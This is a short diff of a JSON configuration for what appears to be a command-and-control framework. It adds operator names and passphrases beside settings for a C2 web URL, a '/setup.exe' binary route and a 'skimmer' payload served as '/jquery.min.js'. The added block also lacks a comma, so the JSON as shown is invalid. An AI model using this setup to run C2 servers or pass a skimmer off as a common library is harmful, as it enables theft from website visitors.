@@ -8,6 +8,10 @@
         "binary_route": "/setup.exe",
         "web_url": "http://c2.redchannel.tld",
         "debug": true
+        "operators": {
+            "neo": "my name is neo!",
+            "litmus": "eddie lives somewhere in time!"        
+        }
     },
     "skimmer": {
         "payload_route": "/jquery.min.js",
